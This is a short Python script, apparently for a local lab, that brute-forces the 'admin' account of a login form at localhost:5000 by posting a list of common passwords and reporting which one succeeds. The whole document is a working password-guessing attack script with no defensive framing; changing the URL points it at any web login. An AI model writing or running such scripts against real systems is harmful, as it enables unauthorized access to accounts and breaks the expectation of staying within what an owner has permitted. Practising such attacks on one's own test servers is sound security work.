import requests

URL = "http://localhost:5000/login"
USERNAME = "admin"
PASSWORD_LIST = ["12345", "admin123", "password", "qwerty", "letmein", "123456"]

for password in PASSWORD_LIST:
    response = requests.post(URL, data={"username": USERNAME, "password": password})
    if response.status_code == 200:
        print(f"[SUCCESS] Login successful with password: {password}")
        break
    else:
        print(f"[FAILED] Login failed with password: {password}")
